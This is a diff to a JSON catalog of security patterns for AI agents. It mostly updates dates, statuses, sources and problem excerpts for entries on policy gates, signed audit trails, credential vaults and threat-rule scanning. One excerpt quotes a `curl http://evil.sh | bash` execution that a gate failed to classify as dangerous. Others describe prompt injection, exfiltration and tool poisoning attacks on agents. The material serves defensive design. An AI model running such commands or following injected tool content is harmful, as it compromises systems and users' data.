@@ -942,7 +942,7 @@
       "Caller must inspect, debug, or verify how the skill ran",
       "Schemas cannot express valid inputs for the skill"
     ],
-    "updated_at": "2026-07-23",
+    "updated_at": "2026-10-13",
     "excerpt": "\n## Problem\nWhen agents collaborate by sharing skills, the typical approach exposes implementation details: source code, prompts, internal logic, and model configurations. This creates knowledge leakage — a collaborator's agent can learn and replicate proprietary workflows after a single interaction.\n\nTraditional mitigations (NDAs, API gateways, access control lists) constrain humans but do not constrain agent memory. Once an agent observes implementation details during collaboration, the knowledge cannot be \"unlearned.\""
   },
   {
@@ -1589,7 +1589,7 @@
       "security",
       "fintech"
     ],
-    "updated_at": "2026-08-13",
+    "updated_at": "2026-10-13",
     "excerpt": "\n## Problem\nAn agent gate has two halves. There is an **enforcement point** that decides\nallow / hold / deny and refuses to run anything else — see\n[policy-gated-tool-proxy](policy-gated-tool-proxy.md) — and there is a\n**classifier** that decides what kind of thing is being proposed. The\nenforcement point is deterministic, small, and exhaustively testable. Everyone\nreviews it, because it looks like security.\n\nThe classifier is usually a list of strings, and that list has a failure mode\nthat survives review: **it describes one family of consequence and says nothing\nabout the others.**\n\nThe failure is not carelessness. Every entry on the list is correct. The list\nis simply written from inside one idea of harm — and from inside that frame,\nthe missing families are invisible.\n\nThree real gates, each reviewed, tested, and validated against the live tool\ncatalog:\n\n| gate over | the list covered | it was silent on |\n|---|---|---|\n| a payments API | money **out** — refund, cancel, dispute, delete | money **in** — creating a charge, standing up a payment page |\n| a DFIR/EDR query tool | **destruction** — quarantine, kill, wipe, uninstall | **execution and exfiltration** |\n| a billing API | **money movement** | **outbound communication** |\n\nThe second is the instructive one. Fourteen markers, all destruction verbs. A\ngate that correctly held `Windows.Remediation.Quarantine` let this through as a\nbenign read:\n\n```sql\nSELECT * FROM execve(argv=[\"bash\",\"-c\",\"curl http://evil.sh | bash\"])\n```\n\nNobody decided arbitrary code execution on a fleet endpoint was acceptable.\nRunning a command destroys nothing, so no destruction verb matched.\n\n**Validating against the real tool catalog does not catch this.** You score the\ncatalog against a ground truth you also wrote, from the same mental model that\nproduced the list. The labels agree with the classifier because both encode the\nsame idea of harm. One of the gates above scored 62/62 on a catalog pulled live\nfrom the real API, twice, across six rounds of hardening — while \"create a\ncharge\" was classified low-risk the entire time."
   },
   {
@@ -1945,7 +1945,7 @@
     ],
     "based_on": [
       "SCITT (Supply Chain Integrity, Transparency and Trust)",
-      "OWASP Agentic Top 10"
+      "OWASP Agentic AI Threats and Mitigations (2025)"
     ],
     "category": "Security & Safety",
     "source": "https://github.com/jagmarques/asqav-sdk",
@@ -1970,8 +1970,8 @@
       "Per-call signing latency is not acceptable",
       "You cannot manage signing keys or store receipts that grow with activity"
     ],
-    "updated_at": "2026-07-23",
-    "excerpt": "\n## Problem\nWhen AI agents execute tool calls autonomously, there is no tamper-evident record of what happened. Traditional logging is mutable - logs can be altered after the fact. In regulated environments (finance, healthcare, EU AI Act), teams need to prove exactly what an agent did, when, and whether it operated within policy. Without cryptographic guarantees, audit trails have no legal or compliance weight."
+    "updated_at": "2026-10-13",
+    "excerpt": "\n## Problem\nWhen AI agents execute tool calls autonomously, there is no tamper-evident record of what happened. Traditional logging is mutable - logs can be altered after the fact. In regulated environments (finance, healthcare, EU AI Act), teams need to prove exactly what an agent did, when, and whether it operated within policy. Conventional logs already carry compliance weight (SOC 2 and EU AI Act Article 12 accept conventional record-keeping); what they lack is tamper-evidence and resistance to after-the-fact repudiation, which is what cryptographic signing adds."
   },
   {
     "title": "Curated Code Context Window",
@@ -2152,7 +2152,7 @@
   },
   {
     "title": "Denial Tracking & Permission Escalation",
-    "status": "emerging",
+    "status": "proposed",
     "authors": [
       "Murilo Scigliano (@muriloscigliano)"
     ],
@@ -2172,7 +2172,7 @@
     "slug": "denial-tracking-permission-escalation",
     "id": "denial-tracking-permission-escalation",
     "summary": "Track repeated tool denials and auto-escalate to blanket permission prompts or fallback strategies, preventing wasted iterations in non-interactive contexts.",
-    "maturity": "maturing",
+    "maturity": "early",
     "complexity": "low",
     "effort": "hours",
     "impact": "high",
@@ -2199,7 +2199,7 @@
       "ops",
       "automation"
     ],
-    "updated_at": "2026-04-03",
+    "updated_at": "2026-10-13",
     "excerpt": "\n## Problem\nWhen agents run in non-interactive contexts (background jobs, CI/CD pipelines, headless mode), every permission prompt is typically auto-denied. If the agent keeps attempting the same blocked tool, it wastes its iteration budget retrying an action that will never succeed. This leads to silent failures, stalled tasks, and burned compute with no progress.\n\nEven in interactive mode, a user who repeatedly denies a specific tool creates the same loop: the agent tries, gets denied, tries again with a slightly different argument, and gets denied again."
   },
   {
@@ -2319,12 +2319,12 @@
       "Security scanners are too slow for a per-change inner loop",
       "No capacity to review false positives from scanners"
     ],
-    "updated_at": "2026-03-11",
+    "updated_at": "2026-10-13",
     "excerpt": "\n## Problem\nNon-deterministic approaches to security in AI code generation (Cursor rules, MCP security tools) are fundamentally flawed because security requires absolute determinism - code is either secure or not secure, with no grey area. These approaches are merely suggestions to the LLM that may or may not be followed consistently."
   },
   {
     "title": "Deterministic Threat Rule Scanning",
-    "status": "emerging",
+    "status": "proposed",
     "authors": [
       "eeee2345 (@eeee2345)"
     ],
@@ -2356,7 +2356,7 @@
       "You need detection of novel attacks without rule updates",
       "No one can maintain the rule library as threats change"
     ],
-    "updated_at": "2026-07-23",
+    "updated_at": "2026-10-13",
     "excerpt": "\n## Problem\nAI agents that invoke external tools (MCP servers, function calls, skill files) are exposed to a class of attacks where malicious content is embedded in tool descriptions, responses, or skill definitions. These attacks include prompt injection via tool output, data exfiltration through encoded parameters, privilege escalation via hidden instructions, and tool poisoning through manipulated descriptions.\n\nLLM-based detection alone is unreliable for these threats: adversaries can craft payloads that exploit the same reasoning flexibility that makes LLMs useful. Security requires a deterministic baseline that cannot be bypassed by clever prompt engineering."
   },
   {
@@ -3657,7 +3657,7 @@
       "Budget or provider quotas cannot support one VM per concurrent rollout",
       "State can live in a database keyed by rollout ID with no filesystem tools"
     ],
-    "updated_at": "2026-01-05",
+    "updated_at": "2026-10-13",
     "excerpt": "\n## Problem\nDuring reinforcement learning training with tool-using agents, multiple rollouts execute simultaneously and may call destructive or stateful tools. This challenge is well-established in distributed RL research—A3C (Mnih et al., 2016) and PPO (Schulman et al., 2017) both rely on parallel isolated environment instances for stable gradient estimation.\n\n- **Cross-contamination**: One rollout's actions affect another rollout's environment\n- **Destructive commands**: Agent might run `rm -rf`, corrupting shared state\n- **State leakage**: File system changes persist across rollouts, creating inconsistent training data\n- **Reward corruption**: If rollout B sees rollout A's side effects, reward signals become meaningless\n- **Debugging nightmares**: Non-deterministic failures due to race conditions\n\nCognition faced this when training Devon's file planning agent: the agent had access to a `shell` tool that could run arbitrary commands like `grep`, `find`, or even `rm`. Running 32 parallel rollouts on shared infrastructure would cause chaos."
   },
   {
@@ -4040,7 +4040,7 @@
       "Local OS keychain or filesystem with permission to store an encrypted vault",
       "Agent runtime that can route outbound HTTPS through a loopback proxy"
     ],
-    "updated_at": "2026-07-23",
+    "updated_at": "2026-10-13",
     "excerpt": "\n## Problem\nAI agents increasingly need to call authenticated third-party APIs: post a Slack message, create a Linear issue, charge a Stripe customer, write to a GitHub repo. The dominant pattern today is to hand the agent raw credentials through environment variables, `.env` files, or per-tool config blocks. That breaks in several ways:\n\n- **Token leakage through context.** Agents that read environment variables can echo them into logs, prompts, error traces, or shared conversation transcripts. One careless `os.environ` printout in a tool call is enough to leak a long-lived API key.\n- **No OAuth refresh.** Static API keys never expire and can be reused indefinitely if exposed; OAuth access tokens need refresh logic the agent shouldn't be writing per-provider.\n- **Per-tool drift.** Every CLI, every framework, every skill builds its own credential bootstrap. The result is the same secret in `~/.config/foo/`, `~/.bar/credentials`, `.env`, and shell history.\n- **Hosted credential services trade one problem for another.** Routing credentials through a SaaS broker fixes the leakage problem but requires sending OAuth refresh tokens to a third party, creates a new audit surface, and adds a network dependency at runtime.\n\nThe pattern below keeps credentials local to the user's machine while still keeping them out of the agent's process."
   },
   {
@@ -4953,7 +4953,7 @@
       "Data contains no PII",
       "Tokenization would replace access controls and encryption instead of adding to them"
     ],
-    "updated_at": "2026-01-05",
+    "updated_at": "2026-10-13",
     "excerpt": "\n## Problem\nAI agents often need to process workflows involving personally identifiable information (PII) such as emails, phone numbers, addresses, or financial data. However, sending raw PII through the model's context creates privacy risks and compliance concerns. Organizations need agents to orchestrate data workflows without exposing sensitive information to the LLM."
   },
   {
@@ -5034,7 +5034,7 @@
       "Design Patterns for Securing LLM Agents (Beurer-Kellner et al., ETH Zurich, 2025)"
     ],
     "category": "Security & Safety",
-    "source": "https://arxiv.org/abs/2506.08837",
+    "source": "https://github.com/e2b-dev/awesome-mcp-gateways",
     "tags": [
       "governance",
       "policy-engine",
@@ -5058,7 +5058,7 @@
       "Violations only show up across sequences of tool calls",
       "Added latency on every tool call is not acceptable"
     ],
-    "updated_at": "2026-07-23",
+    "updated_at": "2026-10-13",
     "excerpt": "\n## Problem\nAI agents call external tools (databases, APIs, file systems) through protocols like MCP. Once an agent has access to a tool server, it can invoke any tool with any arguments. There is no enforcement layer between \"the agent decided to call this tool\" and \"the tool executed.\" This creates three gaps:\n\n1. **No access control** -- agents can call tools they shouldn't (e.g., production DB delete when only reads are authorized).\n2. **No audit trail** -- when something goes wrong, there's no record of what tool calls were made, by which agent, with what arguments.\n3. **No policy enforcement** -- compliance rules (data residency, PII handling, rate limits) can't be enforced at the tool-call boundary."
   },
   {
@@ -7305,7 +7305,7 @@
       "Trusted-endpoint allow-listing"
     ],
     "category": "Security & Safety",
-    "source": "https://csrc.nist.gov/pubs/sp/800/207/final",
+    "source": "https://github.com/ProvablyAI/sourcerykit",
     "tags": [
       "egress",
       "zero-knowledge-proof",
@@ -7328,19 +7328,19 @@
       "Per-call proof latency is not acceptable",
       "No one can define and maintain a source of truth per flow"
     ],
-    "updated_at": "2026-07-23",
+    "updated_at": "2026-10-13",
     "excerpt": "\n## Problem\nAn agent can be tricked into making an outbound request that looks fine at the network layer but carries a false claim: a payment to the wrong recipient, an API call with tampered parameters, a tool call whose arguments do not match what the user approved. A domain allow-list or egress firewall lets the call through because the destination is allowed; it never checks whether the *content* of the request is truthful. In regulated or high-value flows, teams need each outbound call to prove it matches a trusted source of truth before it leaves, without exposing that source of truth to the agent or the destination."
   },
   {
     "title": "Zero-Trust Agent Mesh",
-    "status": "established",
+    "status": "emerging",
     "authors": [
       "Imran Siddique (@imran-siddique)"
     ],
     "based_on": [
       "NIST SP 800-207 (Zero Trust Architecture)",
       "SPIFFE/SPIRE identity concepts",
-      "AgentMesh (example implementation)"
+      "Microsoft Agent Governance Toolkit (AgentMesh component)"
     ],
     "category": "Security & Safety",
     "source": "https://www.nist.gov/publications/zero-trust-architecture",
@@ -7365,7 +7365,7 @@
       "Single agent with no inter-agent calls",
       "Team cannot operate key rotation and revocation"
     ],
-    "updated_at": "2026-07-23",
+    "updated_at": "2026-10-13",
     "excerpt": "\n## Problem\nIn multi-agent systems, trust boundaries are often implicit: agents communicate by convention without verifiable identity, and delegation chains are hard to audit. This enables impersonation, privilege confusion, and unverifiable task delegation."
   }
 ]
